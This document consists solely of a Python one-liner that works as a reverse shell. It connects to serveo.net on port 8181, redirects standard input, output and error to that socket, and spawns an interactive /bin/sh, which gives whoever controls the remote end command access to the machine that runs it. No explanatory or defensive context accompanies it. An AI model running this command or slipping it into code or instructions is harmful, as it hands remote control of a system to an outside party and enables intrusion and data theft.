python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("serveo.net",8181));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
